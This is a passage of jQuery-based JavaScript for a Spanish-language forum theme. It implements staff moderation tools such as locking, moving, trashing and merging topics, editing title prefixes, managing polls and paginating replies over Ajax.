            } catch (o) {
                'undefined' != typeof console && console.error(o)
            }
        },
        lock: function (t) {
            var i, k, l, m,
                n = $.getby('.pbutton1'),
                h = t.href,
                j = $.getby('.titulo-tema')[0],
                k = 'position: absolute; margin-top: -240px; font-size: 90px; margin-left: 10px; color: rgb(255, 0, 8); text-shadow: 0 -1px rgb(255, 255, 255),0 1px rgb(255, 255, 255),1px 0 rgb(255, 255, 255),-1px 0 rgb(255, 255, 255)',
                l = '<i class="fa fa-lock" style="' + k + '"></i>',
                m = j.getAttribute('url'),
                g = /=lock?/g.test(h),
                a = g ? '[b]Mensaje automático[/b]\n\n\n\n[ok]Cierro tema[/ok]' : '[b]Mensaje automático[/b]\n\n\n\n[ok]Re-abro el tema[/ok]',
                b = g ? 'Fallo bloquear el tema vía Ajax\nSeras redireccionado para hacerlo manualmente.' : 'Fallo desbloquear el tema vía Ajax\nSeras redireccionado para hacerlo manualmente.',
                c = g ? '/modcp?mode=unlock&t=' : '/modcp?mode=lock&t=',
                d = g ? 'http://hitsk.in/t/20/69/64/i_topic_unlock.png' : 'http://hitsk.in/t/20/69/64/i_topic_lock.png',
                e = g ? 'Desbloquear este tema' : 'Cerrar este tema',
                f = g ? ' cerró el tema: ' : ' abrió el tema: ';
            $.get(h).done(function () {
                $.post('/post?t=' + ops.id_tema, {
                    'mode': 'reply',
                    'message': a,
                    'post': 'submit',
                    'attach_sig': '1'
                });
            }).success(function () {
                t.href = c + ops.id_tema + '&tid=' + isTid;
                t.children[0].src = d;
                t.children[0].alt = e;
                ops.Nacti_msg = ops.mi_nombre + f + '[url=' + window.location.href + ']' + ops.topic_name + '[/url]';
                ops.Na();
                if (g) {
                    j.classList.add('lock-theme');
                    j.setAttribute('style', 'background:url(' + ops.lang.l_iM + ')rgba(237,36,20,0.35)'),
                        j.insertAdjacentHTML('afterbegin', l);
                    for (i = 0; i < n.length; i++) {
                        n[i].removeAttribute('onclick');
                        n[i].textContent = 'Tema Cerrado';
                    }
                } else {
                    j.classList.remove('lock-theme');
                    j.style = '';
                    j.children[0].remove();
                    for (i = 0; i < n.length; i++) {
                        n[i].setAttribute('onclick', 'ops.start("reply", this, "' + m + '")');
                        n[i].textContent = 'Responder';
                    }
                }
            }).error(function () {
                $.boxes('alert', b);
            })
        },
        activar_tags: function (a) {
            a.classList.remove('actived_tag');
            a.classList.add('close_tag');
            ops.borrar_tags();
            var b = '<div class="accion" style="z-index:9999;margin-top:242px;display:block;margin-left:0;position:absolute;background:rgba(0,0,0,0.44);padding:3px;color:rgba(255, 255, 255, 1);width:988px;height:50px;><fieldset class="fields1"><br>Publicar tema como: <label><input type="radio" name="topictype" value="0" checked="checked"> Normal</label>&nbsp;&nbsp;<label><input type="radio" name="topictype" value="1"> Sticky</label>&nbsp;&nbsp;<label><input type="radio" name="topictype" value="2"> Anuncio</label>&nbsp;&nbsp;<label><input type="radio" name="topictype" value="3"> Anuncio global</label>&nbsp;&nbsp;</fieldset><button class="enviar" onclick="ops.get_tags(this);return false">enviar</button></div>',
                c = $.getby('.topic-actions'),
                d = c.length;
            d && c[0].insertAdjacentHTML('afterbegin', b);
        },
        get_tags: function (c) {
            $.get(ops.path_edit, function (a) {
                $.post('/post', {
                    p: ops.id_f_post,
                    mode: 'editpost',
                    subject: $('.titulo_del_post', a)[0].value,
                    message: $('#editor-textarea', a)[0].value,
                    edit_reason: '',
                    attach_sig: '1',
                    notify: '1',
                    post: 'Enviar',
                    topictype: $('.accion').find('input[name="topictype"]:checked').val(),
                }).done(function () {
                    var a = $.getby('.accion'),
                        b = $.getby('.close_tag')[0];
                    a.length && a[0].remove();
                    b.classList.remove('close_tag');
                    b.addClass('actived_tag');
                });
            });
        },
        postnumber: function () {
            ops.textarea.value += '[post]' + ops.url_tema + '[/post]';
        },
        offset_post: function () {
            var a = $.getby('.long_post'),
                b = document.body;
            if(a.length) {
            for (var i = 0; i < a.length; i++) {
            a[i].style = 'heigth:100%'
            }
            ops.textarea.focus();
            $(b).animate({
                scrollTop: $(ops.editor).offset().top - 100
            }, 300)
            } else {
            $(b).stop().animate({
                scrollTop: $(ops.textarea).offset().top - 100
            }, 300);
            ops.textarea.focus()
            }
        },
        offset_download: function () {
            var a = $.getby('.descargar'),
                b = document.body,
                c = $.getby('.long_post');
            if(a.length) {
            $(b).animate({
                scrollTop: $('.texto-descarga').offset().top
            }, 500);
                for (var i = 0; i < c.length; i++) {
                    a[i].style = 'heigth:100%'
                }
            } else {
                $(b).animate({
                scrollTop: $('.zeditor-new:last').offset().top
            }, 500)
                   }
        },
        aAS_p: function () {
            var c, b, a = $.getby('.nav'),
                d = ops.p_Fi,
                e = 'background:rgba(255, 192, 203, 1);border:1px solid rgba(31, 28, 28, 1);color:rgba(148, 15, 15, 1);font-size:13px;line-height:170%;padding:10px;width:974px;margin-left:-11px;text-shadow:0 1px rgba(255, 255, 255, 1)',
                f = 'background: linear-gradient(to bottom, rgba(255, 26, 0, 1) 0%,rgba(255, 26, 0, 1) 100%);border: 1px solid rgba(255, 0, 0, 1);color: rgba(255, 255, 255, 1);font-size: 13px;line-height: 170%;padding: 10px;width: 974px;margin-left:-11px;';
            if (/\/f(14)(p[0-9]+)?-/.test(a[1].href) && !/\/f(13)(p[0-9]+)?-/.test(a[1].href)) {
                b = '<span><div class="guestMessage" style="' + f + '"><strong>Llena los datos que se te piden al abrir un tema</strong><br/>No nos gusta cerrar soportes, pero si abandonas tu tema cuando se te mencione, 7 dias, se enviara a la papelera.<br/><strong> Este trabajo lo hago por placer, sean pacientes.</strong></div></span>';
                d[0].insertAdjacentHTML('afterbegin', b);
                c = $.getby('.guestMessage');
                setTimeout(function () {
                    c[0].style = e;
                }, 10000);
            }
        },
        mod_0: function (e) {
            $.boxes({
                mode: 'confirm',
                title: '¿Deseas eliminar este tema',
                ok: function () {
                    $.post(e.href, {
                        confirm: 1
                    }, function () {
                        $.boxes('alert', 'Tema borrado');
                        location.href = '/';
                    })
                }
            });
        },
        mod_1: function (u) {
            var b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, a = u.href;
            $.get(a).done(function () {
                $.get(ops.path_edit).done(function (z) {
                    b = $.getby('#url_a_t');
                    c = '<span class="prefijo rechazado">rechazado</span>';
                    d = $('#editor-textarea', z)[0];
                    e = $('.titulo_del_post', z)[0];
                    f = '\n [b]Mensaje automático[/b]\n\n\n\n[ok]Se movio el tema a la papelera[/ok]';
                    g = (ops.topic_name, d.value + f);
                    h = new RegExp('\\[(.*?)\\]', 'g');
                    i = $('input[name="topictype"]:checked', z)[0].value;
                    j = '[rechazado]';
                    k = e.value.match(/\[(.*?)\]/) != null ? (e.value = e.value.replace(h, j)) : (e.value = j + '&nbsp;' + e.value);
                    l = $.getby('.pathname-box');
                    m = '<a href="/f2-papelera" class="nav"><span class="trash">Papelera</span></a>';
                    n = $.getby('.nav');
                    o = $.getby('.titulo-tema')[0];
                    p = 'position:absolute;margin-top:-260px;font-size:90px;margin-left:10px;text-shadow:none;color:rgb(165, 42, 42)';
                    q = 'background:url(http://adictosalgear.org/trash.png) rgba(255,255,136,1)!important;';
                    r = /\<span class=?"?(.*?)"?>(.*?)\<\/span>/;
                    s = $.getby('.lock-theme'),
                        u = o.getElementsByClassName('fa-lock')[0];
                    l[1].getElementsByClassName('nav')[2].outerHTML = m;
                    l[0].getElementsByClassName('nav')[1].outerHTML = m;
                    b.innerHTML.match(r) == null ? b.innerHTML = c + b.textContent : b.innerHTML = c + b.innerHTML.match(r)[1];
                    for (t = 0; t < n.length; t++) /\/f[3]\-.+/g.test(n[t].href) && n[t].remove();
                    s.length ? (o.style = q, u.className = 'fa fa-trash', u.style = p) : (o.classList.add('lock-theme'), o.style = q, o.innerHTML = '<i class="fa fa-trash" style="' + p + '"></i>' + o.innerHTML);
                    ops.Nacti_msg = ops.mi_nombre + ' envió a la papelera el tema: [url=' + window.location.href + ']' + ops.topic_name + '[/url]';
                    ops.Na();
                    ops.edit_post_f(k, g, '1', 'Enviar', i, k, ops.id_f_post, '');
                });
            }).fail(function () {
                $.boxes('alert', 'Fallo el envio a la papelera vía Ajax\nSeras redireccionado para hacerlo manualmente.')
            })
        },
        mod_2: function (e) {
            var o = ops.lang.movertema;
            var a = document.createElement('div'),
                b = document.body,
                c = b.parentNode;
            a.id = 'moveTpcHw';
            a.innerHTML = o;
            a.style.display = 'block';
            c.insertBefore(a, b);
            ops.back()
        },
        mod_2_c: function () {
            var a = $.getby('#moveTpcHw'),
                b = $.getby('#lightBG');
            $._fadeOut(a, 400);
            $._fadeOut(b, 400);
        },
        mod_2_f: function () { //checked javascript
            var g, h, i, j, k, a = $.getby('.nav').length && ($.getby('.nav')[1].textContent),
                Select = $.getby('#contHw').getElementsByTagName('select'),
                b = Select[0].options[Select[0].selectedIndex],
                c = b.value,
                d = b.textContent.match(/[A-Za-z0-9_]+.*/g)[0].toLowerCase().replace(' ', '-'),
                e = b.textContent.match(/[A-Za-z0-9_]+.*/)[0],
                f = '[b]Mensaje automático[/b]\n\n\n\n[ok]Se movio el tema del subforo ' + a + ' a ' + e + '[/ok]';
            $.post('/modcp?mode=move&t=' + ops.id_tema + '&tid=' + isTid, {
                confirm: 1,
                new_forum: c
            }).success(function () {
                i = $.getby('.pathname-box');
                g = i[1].children[0].children[2];
                h = i[0].children[0].children[1];
                j = $.getby('#contHw');
                g.href = '/' + c + '-' + d;
                h.href = '/' + c + '-' + d;
                g.textContent = e;
                h.textContent = e;
                ops.soy_staff && (j.children[0].innerHTML = ops.ajax_load)
                $.post('/post?t=' + ops.id_tema, {
                    mode: 'reply',
                    message: f,
                    post: 'submit',
                    attach_sig: '1'
                }), ops.Nacti_msg = ops.mi_nombre + ' movió el tema: [url=' + window.location.href + ']' + ops.topic_name + '[/url] a ' + e, ops.Na(), setTimeout(function () {
                    k = $.getby('#moveTpcHw');
                    $._fadeOut(k, 400);
                }, 1e3), $.boxes({
                    mode: 'alert',
                    title: 'El tema se movio satisfactoriamente',
                    ok: function () {
                        ops.mod_2_c();
                    }
                })
            }).fail(function () {
                $.boxes('alert', 'Fallo el mover el tema vía Ajax\nSeras redireccionado para hacerlo manualmente.')
            })
        },
        //convertir
        mod_4: function (e) {
            //corrigiendo en ele archivo merge.js en documentos
        },
        mod_4_bis: function (d) {
            var url = d.href;
            $.post('/merge', {
                tid: isTid,
                from_topic: ts.match(/\d+/g)[0],
                to_topic: url.match(/\d+/)[1],
                submit: 1,
                f: $('.vf_jumpbox').find(':selected').val().match(/\d+/)[0],
                confirm: 1
            }).done(function () {
                $.get(ops.path_edit, function (e) {
                    var t = $('#editor-textarea', e)[0].value,
                        o = '\n [b]Mensaje automático[/b]\n\n\n\n[ok]Se fusiono el tema[/ok]',
                        a = $('.nuevo_titulo_ajax', e)[0].value,
                        i = t + o,
                        n = $('input[name="topictype"]:checked', e).val(),
                        s = console.log('mod_4 ok');
                    ops.edit_post_f(a, i, '1', 'Enviar', n, s, ops.id_f_post, '')
                });
                $('.merge_box').remove(), ops.back_close(''), window.location.href = url
            })
        },
        mod_6: function () {
            var t, e = $.getby('.no_code');
            if (e.length) {
                for (t = 0; t < e.length; t++) {
                    e[t].style.display = 'block'
                }
            }
            var f = $.getby('.long_post');
            if (f.length) {
                for (t = 0; t < f.length; t++) {
                    f[t].style.height = '100%'
                }
            }
            e.length && ($._smoothScroll(e[0], 200))
        },
        mod_7: function (p) {
            $.get(ops.path_edit, function (e) {
                var a = $('input[name="topictype"]:checked', e)[0].value,
                    b = $.getby('#url_a_t'),
                    c = /<([a-z]+)([^<]+)*(?:>(.*)<\/\1>|\s+\/>)/g,
                    d = '<span class="prefijo en-curso">En curso</span>',
                    e = b.innerHTML.replace(c, ''),
                    f = $('#editor-textarea', e)[0].value,
                    g = '[En curso] ' + e,
                    h = b.innerHTML = d + e;
                console.log('titulo:' + e);
                ops.edit_post_f(g, f, '1', 'Enviar', a, h, ops.id_f_post, '')
            })
        },
        mod_8: function (p) {
            $.get(ops.path_edit, function (e) {
                var a = $('#editor-textarea', e)[0].value,
                    b = $.getby('#url_a_t'),
                    c = /<([a-z]+)([^<]+)*(?:>(.*)<\/\1>|\s+\/>)/g,
                    d = b.innerHTML.replace(c, '[Resuelto]'),
                    e = $('input[name="topictype"]:checked', e)[0].value,
                    f = $.getby('.nav'),
                    g = '\n \n [b]Mensaje automático[/b]\n\n\n\n[ok]Cierro tema, y muevo a [b]Pedidos resueltos[/b][/ok]',
                    h = '\n \n [b]Mensaje automático[/b]\n\n\n\n[ok]Cierro tema, y muevo a [b]Temas resueltos[/b][/ok]',
                    i = f.length && (f[1].href.indexOf('grafica') > 1) ? g : h;
                ops.edit_post_f(d, a + i, '', 'Enviar', e, ops.mod_8_done(p), ops.id_f_post, '');
                console.log('Mod: Archivar Titulo:' + d);
            })
        },
        mod_8_done: function (p) {
            var t, r, a, x, A, R, Z, k, b = $.getby('.titulo-tema'),
                c = $.getby('#url_a_t'),
                m = 'position: absolute; margin-top: -240px; font-size: 90px; margin-left: 10px; color: #FF0008; text-shadow: 0 -1px rgb(255, 255, 255),0 1px rgb(255, 255, 255),1px 0 rgb(255, 255, 255),-1px 0 rgb(255, 255, 255)',
                o = '<span class="prefijo resuelto">Resuelto</span>',
                q = 'http://hitsk.in/t/20/69/64/i_topic_unlock.png',
                s = $.getby('.pathname-box'),
                u = '<i class="fa fa-lock" style="' + m + '"></i>',
                v = '<a href="/f17-pedidos-resueltos" class="nav"><span>Pedidos Resueltos</span></a>',
                n = '<a href="/f3-temas-resueltos" class="nav"><span class="resueltos">Temas resueltos</span></a>',
                w = $.getby('.guestMessage'),
                y = /<([a-z]+)([^<]+)*(?:>(.*)<\/\1>|\s+\/>)/g,
                z = $.getby('.nav');
            $.get('/modcp?mode=lock&t=' + ops.id_tema + '&tid=' + isTid, function (e) {
                r = z.length && (z[1].href.indexOf('grafica') > 1) ? 'f17' : 'f3';
                ops.move_mod_8(ops.id_tema, r);
                ops.Nacti_msg = ops.mi_nombre + ' cerró y movió a resueltos el tema: [url=' + window.location.href + ']' + ops.topic_name + '[/url]', ops.Na();
                Z = z.length;
                if (Z)
                    for (t = 0; Z > t; t++) /grafica/.test(z[t].href) && (z[t].outerHTML += v), /soporte/.test(z[t].href) && (z[t].outerHTML += n);
                if (a = $.getby('.nombre-tema'), A = a.length)
                    for (t = 0; A > t; t++) x = a[t].children[0].innerHTML.replace(y, o), a[t].children[0].innerHTML = x;
                if (r = $.getby('.pbutton1'), R = r.length)
                    for (t = 0; R > t; t++) r[t].removeAttribute('onclick'), r[t].textContent = 'Tema Cerrado';
                w.length && w[0].remove();
                k = c.innerHTML.replace(y, o);
                c.innerHTML = k;
                b[0].classList.add('lock-theme');
                b[0].style = 'background:url(' + ops.lang.l_iM + ')rgba(237,36,20,0.35)';
                b[0].insertAdjacentHTML('afterbegin', u);
                p.href = '/modcp?mode=lock&t=' + ops.id_tema + '&tid=' + isTid;
                p.children[0].src = q;
            })
        },
        move_mod_8: function (a, b) {
            $.post('/modcp?mode=move&t=' + a + '&tid=' + isTid, {
                confirm: 1,
                new_forum: b,
                notify: '1'
            });
        },
        mod_10: function (e) {
            var t = e.href,
                a = 'position:absolute;border:1px solid rgb(51, 51, 51);padding:5px;background:rgb(255, 255, 255);margin-top:15px;margin-left:210px;box-shadow:1px 1px 5px rgb(85, 85, 85);min-width:75px;min-height:14px',
                b = 'margin-left:289px;margin-top:12px;display:inline-table;z-index:100;position:absolute;font-size:15px;cursor:pointer;text-shadow:0 1px 3px rgb(0, 0, 0);color:rgb(255, 255, 255);',
                c = '<div id="ipcontenedor" style="position:absolute"><span class="ipload" style="' + a + '"></span><a class="cerrar_ip" onclick="$(this).parent().remove()" style="' + b + '"><i class="fa fa-times-circle-o"></i></a></div>';
            e.parentNode.parentNode.insertAdjacentHTML('beforeend', c);
            $.get(t, function (u) {
                var h = $('#cp-main table td:first a', u)[0].outerHTML;
                $.getby('.ipload')[0].innerHTML = h;
            })
        },
        mod_11: function () {
            var g, d, b, c, f, h, a = $.getby('.titulo-tema')[0];
            a.classList.add('edit_ajax_todo');
            $.get(ops.path_edit, function (e) {
                b = ops.id_f_post,
                    c = $('.titulo_del_post', e)[0].value,
                    d = $('#editor-textarea', e)[0].value,
                    e = 'z-index:900;margin-top:-21px;font-size:12px;width:600px',
                    f = $.getby('#url_a_t'),
                    g = $('#type_toogle input:checked', e),
                    h = g.length && g[0].value;
                f.style.display = 'none'
                f.insertAdjacentHTML('afterend', '<input id="edit_ajax_title" style="' + e + '" placeholder="Escribe el título"class="inputbox medium"type="text"name="subject"value="' + c + '"/>');
            }).done(function () {
                $.getby('#edit_ajax_title').onkeydown = function (t) {
                    13 === t.keyCode && ops.edit_post_f(this.value, d, '', 'Enviar', h, ops.mod_11_done(this.value), b, '')
                };
            })
        },
        mod_11_done: function (e) {
            var a = $.getby('#url_a_t'),
                b = $.getby('.titulo-tema')[0],
                c = $.getby('#edit_ajax_title');
            a.textContent = e;
            a.style.display = 'inline-block';
            c.remove();
            ops.prefijos_all_add();
            b.classList.remove('edit_ajax_todo');
            ops.notify('Se cambio el título a: ' + e);
        },
        mod_12: function (e) {
            var N, i, t = $.getby('#edit_ajax_title'),
                c = /\[.*?\]/g;
            t ? (N = t.value.match() ? t.value.replace(c, '') : t.value, t.value = e.value + ' ' + N) : $.get(ops.path_edit, function (f) {
                var b = $('.titulo_del_post', f)[0],
                    N = b.value.match(c) ? b.value.replace(c, '') : b.value,
                    u = $('#editor-textarea', f)[0].value,
                    o = e.id == 'resuelto_ajax' ? e.getAttribute('value') + ' ' + N : e.value + ' ' + N,
                    a = e.id == 'resuelto_ajax' ? e.getAttribute('value').match(/\[(.*?)\]/)[1].toLowerCase() : e.value.match(/\[(.*?)\]/)[1].toLowerCase(),
                    n = '<span class="prefijo ' + a + '">' + a + '</span> ',
                    F = $.getby('#url_a_t').innerHTML = o,
                    d = $.getby('.nombre-tema');
                console.log(e.getAttribute('name'));
                for (i = 0; i < d.length; i++)(d[i].children[0].innerHTML = o);
                ops.notify('Se cambio el título a:' + n + N);
                ops.prefijos_all_add(), ops.edit_post_f(o, u, '1', 'Enviar', '', F, ops.id_f_post, '')
            })
        },
        edit_post_f: function (e, t, o, a, i, n, s, p) {
            $.post('/post', {
                p: s,
                mode: 'editpost',
                subject: e,
                message: t,
                edit_reason: '',
                attach_sig: '1',
                notify: o,
                post: a,
                topictype: i,
                poll_length: p
            }).done(function () {
                n + console.log('Se editó con éxito')
            })
        },
        start_mod: function (e, t) {
            var a = $.getby('.nav');
            switch (e) {
            case 'mod_0':
                ops.mod_0(t);
                break;
            case 'mod_1':
                a.length && (/\/f(2)(p[0-9]+)?-/.test(a[1].href)) ? ops.mod_2(t) : ops.mod_1(t);
                break;
            case 'mod_2':
                a.length && (/\/f(2)(p[0-9]+)?-/.test(a[1].href)) ? ops.lock(t) : ops.mod_2(t);
                break;
            case 'mod_3':
                a.length && (/\/f(2)(p[0-9]+)?-/.test(a[1].href)) ? location.href = t.href : ops.lock(t);
                break;
            case 'mod_4':
                a.length && (/\/f(2)(p[0-9]+)?-/.test(a[1].href)) ? ops.mod_4(t) : location.href = t.href;
                break;
            case 'mod_5':
                ops.mod_4(t);
                break;
            case 'mod_6':
                ops.mod_6();
                break;
            case 'mod_7':
                ops.mod_7(t);
                break;
            case 'mod_9':
                ops.activar_tags(t);
                break;
            case 'mod_10':
                ops.mod_10(t);
                break;
            case 'mod_11':
                (ops.autor_tema === ops.mi_nombre || ops.soy_staff) && ops.mod_11();
                break;
            case 'mod_12':
                ops.mod_12(t)
            }
        },
        mD_Tl: function () {
            try {
                var e = ops.soy_staff && ($.getby('.clone')[0].children);
                for (var t = 0; t < e.length; t++) {
                    var j = 'mod_' + t;
                    e[t].classList.add('mod_' + t);
                    e[t].setAttribute('onclick', 'ops.start_mod(\'' + j + '\',this); return false');
                }
                var e = ops.soy_staff && ($.getby('.moderar')[1].children);
                for (var t = 0; t < e.length; t++) {
                    var j = 'mod_' + t;
                    e[t].classList.add('mod_' + t);
                    e[t].setAttribute('onclick', 'ops.start_mod(\'' + j + '\',this); return false');
                }
            } catch (o) {
                'undefined' != typeof console && console.error(o)
            }
            if (ops.autor_tema === ops.mi_nombre || ops.soy_staff) {
                var e = '<option name="" value="">Cambia el prefijo ajax</option><option name="[Ocio]" value="[Ocio]">Ocio</option><option name="[aviso]" value="[aviso]">Aviso</option><option name="[pedido]" value="[pedido]">Pedido</option><option name="[actualizado]" value="[actualizado]">Actualizado</option><option name="[sugerencia]" value="[sugerencia]">Sugerencia</option><option name="[Publicidad]" value="[Publicidad]">Publicidad</option><option name="[Afiliación]" value="[Afiliación]">Afiliación</option><option name="[Ayuda]" value="[Ayuda]">Ayuda</option><option name="[Recursos]" value="[Recursos]">Recursos</option><option name="[Resuelto]" value="[Resuelto]">Resuelto</option><option name="[Beta]" value="[Beta]">Beta</option><option name="[Tutorial]" value="[Tutorial]">Tutorial<option name="[CSS]" value="[CSS]">CSS</option><option name="[jQuery]" value="[jQuery]">jQuery</option><option name="[Javascript]" value="[Javascript]">Javascript</option><option name="[Staff]" value="[Staff]">Staff</option><option name="[Novedades]" value="[Novedades]">Novedades</option><option name="[html]" value="[html]">Html</option><option name="[widget]" value="[widget]">Widget</option><option name="[phpBB3]" value="[phpBB3]">phpBB3</option><option name="[PunBB]" value="[PunBB]">PunBB</option><option name="[invision]" value="[invision]">Invision</option><option name="[Todas]" value="[Todas]">Todas</option><option name="[Revisado]" value="[Revisado]">Revisado</option><option name="[Cerrado]" value="[Cerrado]">Cerrado</option><option name="[Duda]" value="[Duda]">Duda</option><option name="[Skin]" value="[Skin]">Skin</option><option name="[Sugerencia]" value="[Sugerencia]">sugerencia</option></option><option name="[Esperando datos]" value="[Esperando datos]">Esperando datos</option>';
                try {
                    var a = document.createElement('select'),
                        b = $.getby('.tema-info')[0],
                        c = b.parentNode;
                    c.insertBefore(a, b);
                    a.id = 'prefTM';
                    a.setAttribute('onchange', 'ops.start_mod(\'mod_12\',this); return false');
                    a.innerHTML = e;
                    a.style = 'position:absolute;margin-left:-13%;margin-top:241px;z-index: 10;';
                } catch (o) {
                    'undefined' != typeof console && console.error(o)
                }
            }
            if (ops.soy_staff) {
                for (var e = $.getby('.ip'), t = 0; t < e.length; t++) {
                    var j = 'mod_10';
                    e[t].children[0].setAttribute('onclick', 'ops.start_mod(\'' + j + '\' ,this); return false');
                }
                var z = "display:none;text-indent: -1px;",
                    d = "display:none;",
                    k = "display:none;",
                    i = '<a href="#" onclick="ops.start_mod(\'mod_6\',this); return false"><i class="fa fa-tripadvisor" style="' + k + '" ></i></a><a id="en_curso_" href="#" onclick="ops.start_mod(\'mod_7\',this); return false"><i class="fa fa-history soporte" style="' + d + '"></i></a><a id="archivar_" href="#" onclick="ops.mod_8(this); return false"><i class="fa fa-archive soporte" style="' + z + '"></i></a><a href="#" class="actived_tag" onclick="ops.start_mod(\'mod_9\',this); return false"><i class="fa fa-tags"></i></a>';
                var mod = $.getby('.moderar'),
                    l = mod.length;
                if (l) {
                    for (t = 0; t < l; t++) {
                        mod[t].insertAdjacentHTML('afterbegin', i);
                    }
                }
                try {
                    var nav = $.getby('.nav'),
                        l = nav.length,
                        cinco = nav.length < 6;
                    if (l) {
                        for (var t = 0; t < l; t++) {
                            if (/\/f(4|5|6|7|11|15|16)(p[0-9]+)?-/.test(nav[t].href)) {
                                var visor = $.getby('.fa-tripadvisor');
                                l = visor.length;
                                for (var t = 0; t < l; t++) {
                                    visor[t].classList.add('active');
                                    visor[t].style.display = 'inline-block'
                                }
                            } else if (/\/f(14)(p[0-9]+)?-/.test(nav[t].href) && cinco || /\/f(12)(p[0-9]+)?-/.test(nav[t].href) && cinco) {
                                var sop = $.getby('.soporte'),
                                    l = sop.length;
                                for (var t = 0; t < l; t++) {
                                    sop[t].classList.add('active');
                                    sop[t].style.display = 'inline-block'
                                }
                            }
                        }
                    }
                } catch (a) {
                    'undefined' != typeof console && console.error(a)
                }
            }
        },
        poll: function () {
            var d, h, t, m, a = $.getby('.close_poll'),
                b = a.length && a[0].getElementsByTagName('a'),
                c = '<i class="fa fa-times-circle poll_close" onclick="ops.close_poll(this);return false" style="color:rgb(255, 0, 0)" title="Cerrar las votaciones"></i>',
                e = $.getby('#poll_ballot') ? $.getby('#poll_ballot') : $.getby('#poll_result'),
                f = e && e.getElementsByTagName('h3')[0],
                g = $.getby('.nick'),
                m = $.getby('.frm-buttons');
            b.length > 0 && (b[0].innerHTML = c);
            d = $.getby('.poll_close');
            if (a.length && a[0].innerHTML == '' && ops.soy_staff) {
                f.insertAdjacentHTML('beforeend', '<i class="fa fa-folder-open open_poll" aria-hidden="true" onclick="ops.open_poll(this)"></i>');
            }
        },
        close_poll: function (c) {
            var e = $.getby('#poll_ballot') ? $.getby('#poll_ballot') : $.getby('#poll_result');
            console.log(c.parentNode.href);
            $.get(c.parentNode.href, function () {
                console.log('Ok: Votaciones cerradas');
                $.get(document.location.pathname).done(function (a) {
                    e.outerHTML = $('#poll_result', a)[0].outerHTML;
                })
            })
        },
        open_poll: function (c) {
            var m = $.getby('#poll_ballot') ? $.getby('#poll_ballot') : $.getby('#poll_result');
            $.get(ops.path_edit, function (e) {
                var a = $('form.ps', e).serialize();
                $.post('/post', a + '&poll_length=0&post=1').done(function () {
                    $.get(document.location.pathname).done(function (a) {
                        m.outerHTML = $('#poll_result', a)[0].outerHTML;
                    });
                })
            })
        },
        back: function (c) {
            var b, a = $.getby('#lightBG');
            $._fadeIn(a, 400);
            if ('undefined' != typeof c) {
                b = $.getby(c);
                $._fadeIn(b, 400);
            }
        },
        back_close: function (c) {
            var a = $.getby('#lightBG');
            $._fadeOut(a, 200);
            'undefined' != typeof c && $._fadeOut(c, 200);
        },
        pR_Tm: function () {
            ops.color_shadow = 'color:' + ops.u_pt + '!important;text-shadow:' + ops.m_pt + '!important';
            var a = $.getby('#cover-theme'),
                b = $.getby('.author_name')[0],
                c = $.getby('#url_a_t'),
                d = $.getby('.author-titulo')[0],
                e = $.getby('.avatar-titulo')[0],
                g = $.getby('.nav');
            a.src = ops.d_pt;
            b.innerHTML = ops.c_pt;
            c.style = ops.color_shadow;
            d.style = ops.color_shadow;
            e.src = ops.f_pt;
            for (var i = 0; i < g.length; i++) /\/c[0-9]\-.+/g.test(g[i].href) && g[i].remove();
            ops.autor_tema = d.childNodes[1].textContent;
            ops.f_tmT();
            ops.count_t();
        },
        count_t: function () {
            var p = $.getby('.pag-img'),
                f = $.getby('.countpost')[0],
                c = $.getby('#End_').previousSibling.getElementsByClassName('postNumberContainer')[0],
                n = Number(c.textContent.match(/\d+/g)),
                a = '<span class="countpost" style="margin-right:5px;margin-top:6px"> no tiene respuestas.</span>';
            ops.r_pt = (p.length > 3) && p[1].previousSibling.previousSibling.href;
            ops.s_pt = n - 1;
            ops.l_pt = '1' == n;
            ops.p_pt = '2' == n;
            ops.l_pt ? f.innerHTML = a : ops.p_pt ? f.innerHTML = '<span class="countpost" style="' + ops.q_pt + '"> tiene solo ' + ops.s_pt + ' respuesta.</span>' : ops.r_pt ? $.get(ops.r_pt, function (e) {
                var t = $('.postNumberContainer:last', e)[0].textContent.match(/\d+/g)[0] - 1;
                f.innerHTML = '<span class="countpost" style="' + ops.q_pt + '"> tiene ' + t + ' respuestas.</span>'
            }) : f.innerHTML = '<span class="countpost" style="' + ops.q_pt + '"> tiene ' + ops.s_pt + ' respuestas.</span>';
        },
        plus_: tm && $.getby('.plusmenu')[0].innerHTML,
        pg_jx: function () {
            $('.Nuevo').length && $('html,body').animate({
                scrollTop: $('.Nuevo').offset().top - 100
            }, 300);
            ops.c_sT = document.querySelectorAll('.content strong');
            ops.p_Fi = $.getby('.post');
            //convertir
            $('.plusmenu').find('script').remove();
            $('.pagination').find('a[href*="/t"]').on('click', function (o) {
                o.preventDefault();
                var href = this.href;
                ops.net_ = $.getby('.redes')[0].innerHTML;
                ops.p_Fjx(href, ops.net_, ops.plus_);
                ops.back_jx()
            })
        },
        n_Pjx: function () {
            N_p = $('.post').length, net = $('.redes').html(), a_C = $('.pagination.top').find('a[href*="/t"]').not('.page-img').last().text(), ops.o_pt ? href = ops.r_pt : href = $('.postNumber').last().attr('href').split('#')[0], $.get(href, function (t) {
                return html = $('#recuadro', t)[0].outerHTML, n_Ax = $('.post', t).length, aCjx = $('.pagination.top', t).find('a[href*="/t"]').not('.page-img').last().text(), N_p < n_Ax ? (console.log(N_p < n_Ax), $(document.body).append('<div class="newP" style="position:fixed;top:40%;right:40%;background:rgb(221, 84, 1);z-index:999;color:rgb(255, 255, 255);font:14px monda;width:300px;text-align:center;box-shadow:0 1px 20px rgb(0, 0, 0);"><i class="fa fa-comment"></i> Hay un nuevo comentario</div>'), setTimeout(function () {
                    $('.newP').remove()
                }, 3e3), $('#recuadro').html(html), BBcode(), ops.t_Tm(), ops.prefijos_all_add(), $('.redes').html(net), ops.p_Sjx(), $('html,body').animate({
                    scrollTop: $('.post:last').offset().top
                }, 500), void 0) : !1
            })
        },
        p_Fjx: function (c, d, e) {
            $.get(c, function (o) {
                var url = $('#recuadro', o)[0].outerHTML;
                $.getby('#recuadro').outerHTML = url;
                $.getby('.plusmenu')[0].innerHTML = e;
            }).done(function () {
                BBcode(), ops.t_Tm();
                ops.C_pSo();
                ops.prefijos_all_add();
                $.getby('.redes')[0].innerHTML = d,
                    setTimeout(ops.tooltipster_init(), 1500);
            }).success(function (o) {
                ops.nC_Tm();
                ops.p_Sjx();
                ops.back_close();
                ops.add_amigos_post();
            })
        },
        r_wA: function () {
            var e = $.getby('.post');
            for (var i = 0; i < e.length; i++) {
                var af = e[i].getElementsByClassName('add_friends').length;
                if (af) {
